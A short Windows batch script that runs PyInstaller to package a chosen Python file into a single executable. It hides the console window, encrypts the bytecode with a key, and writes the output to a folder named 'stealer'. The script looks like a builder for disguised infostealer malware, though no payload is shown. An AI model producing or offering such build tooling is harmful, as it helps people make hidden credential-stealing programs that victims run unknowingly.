@echo off
cls
color d
title lol dane e sus
set /p "name= > Enter the name of the exe : "
set /p "key= > Enter the key : "
set /p "file= > Enter py file name : "
pyinstaller --onefile --noconsole --key %key% --distpath stealer/ --name %name% %file%.py
title sus - done
echo Done